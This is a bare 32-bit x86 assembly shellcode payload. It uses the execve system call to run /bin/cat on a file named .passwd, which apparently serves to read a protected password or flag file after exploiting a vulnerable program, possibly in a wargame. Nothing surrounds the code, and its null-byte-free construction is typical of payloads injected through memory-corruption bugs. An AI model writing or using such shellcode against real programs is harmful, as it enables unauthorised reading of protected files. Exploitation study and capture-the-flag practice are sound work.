.code32

xor	%eax, %eax

movl	%eax, %edx # edx = NULL = envp

pushl	%eax # "\0\0\0\0"
pushl	$0x7461632f # "/cat"
pushl	$0x6e69622f # "/bin"
movl	%esp, %ebx # ebx = "/bin/cat" = filename

pushl	%eax # "\0\0\0\0"
pushl	$0x64777373 # "sswd"
pushl	$0x61702e2f # "/.pa"
pushl	$0x2f2f2f2e # ".///"
movl	%esp, %ecx

pushl	%eax # NULL
pushl	%ecx # ".passwd"
pushl	%ebx # filename
movl	%esp, %ecx # ecx = [ filename, ".passwd", NULL ] = argv

movb	$11, %al
int	$0x80
